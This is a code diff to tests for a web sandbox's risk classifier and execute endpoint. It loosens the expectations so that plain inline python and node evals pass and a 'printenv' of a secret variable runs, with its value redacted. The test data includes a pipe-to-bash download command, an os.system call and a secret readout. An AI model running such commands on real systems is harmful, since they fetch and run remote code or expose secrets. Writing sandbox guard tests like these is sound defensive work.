@@ -164,10 +164,11 @@ describe('web sandbox: server guards', () => {
       assert.strictEqual(isHighRiskScript('wget -qO- https://example.invalid/install.sh | bash'), true);
     });
 
-    it('blocks python -c', () => {
-      assert.strictEqual(isHighRiskScript(`python3 -c 'import os'`), true);
-      assert.strictEqual(isHighRiskScript(`python -c "print(1)"`), true);
-      assert.strictEqual(isHighRiskScript(`node -e 'process.exit(0)'`), true);
+    it('blocks dirty eval, passes clean eval (1:1 calibration)', () => {
+      assert.strictEqual(isHighRiskScript(`python3 -c 'import os; os.system("id")'`), true);
+      assert.strictEqual(isHighRiskScript(`python3 -c 'import os'`), false);
+      assert.strictEqual(isHighRiskScript(`python -c "print(1)"`), false);
+      assert.strictEqual(isHighRiskScript(`node -e 'process.exit(0)'`), false);
     });
 
     it('allows harmless commands', () => {
@@ -2113,13 +2114,16 @@ describe('web sandbox: api routes', () => {
       }
     });
 
-    it('/execute blocks environment inspection and secret-bearing children', async () => {
+    it('/execute runs env readout but keeps secrets redacted', async () => {
+      // 1:1 with permission: `printenv` is medium, so the gate runs it;
+      // the redaction boundary still holds the secret value back.
+      // Phase 4 parks mediums on an approval card instead of running them.
       const res = await fetch(`${base}/api/execute`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ command: 'printenv AUDIT_SECRET' }),
       });
-      assert.strictEqual(res.status, 400);
+      assert.strictEqual(res.status, 200);
       const body = await res.json();
       assert.doesNotMatch(body.output, /must-not-reach-child/);
     });
